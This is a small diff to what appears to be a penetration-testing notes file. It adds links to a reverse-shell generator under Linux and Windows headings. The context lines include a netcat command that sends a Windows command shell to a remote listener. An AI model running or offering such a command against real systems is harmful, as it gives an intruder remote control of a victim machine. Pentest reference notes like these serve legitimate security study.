@@ -458,11 +458,13 @@ Linux
 
 -   http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 -   https://awansec.com/reverse-shell.html
+-   https://www.revshells.com/
 
 Windows
 
 -   https://github.com/Dhayalanb/windows-php-reverse-shell
 -   nc 10.10.10.10 4444 –e cmd.exe
+-   https://www.revshells.com/
 
 ## Shell Upgrading
 
